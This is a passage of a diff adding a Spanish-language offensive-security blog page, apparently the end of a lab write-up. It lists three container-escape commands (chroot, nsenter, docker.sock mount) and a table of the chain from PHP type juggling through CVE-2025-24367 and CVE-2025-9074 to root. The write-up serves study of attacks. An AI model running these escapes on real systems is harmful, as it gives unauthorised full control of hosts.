+<li><p><code>/host_root/etc/crontab</code> (ejecutar comandos como root)</p>
+</li>
+</ul>
+</li>
+<li><p><strong>Escape completo</strong> usando técnicas como:</p>
+<p>bash</p>
+<h1>Método 1: via chroot</h1>
+<p>chroot /host_root /bin/bash</p>
+<h1>Método 2: via nsenter</h1>
+<p>nsenter --mount=/proc/1/ns/mnt /bin/bash</p>
+<h1>Método 3: via docker.sock</h1>
+<p>docker -H unix:///host_root/var/run/docker.sock run -v /:/host2 -it ubuntu bash</p>
+</li>
+</ol>
+<p><strong>Impacto final</strong>: Control total del host Windows/Linux como administrador/root.</p>
+<table>
+<thead>
+<tr>
+<th>Etapa</th>
+<th>Vulnerabilidad</th>
+<th>Tipo</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>PHP Type Juggling</td>
+<td>Bypass de autenticación</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Credential Reuse</td>
+<td>Acceso no autorizado</td>
+</tr>
+<tr>
+<td>3</td>
+<td>CVE-2025-24367</td>
+<td>RCE autenticado en Cacti</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Docker API 2375 abierta</td>
+<td>Exposición crítica</td>
+</tr>
+<tr>
+<td>5</td>
+<td>CVE-2025-9074</td>
+<td>Escape de contenedor a ROOT</td>
+</tr>
+</tbody>
+</table>
+<p>[redacted]</p>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
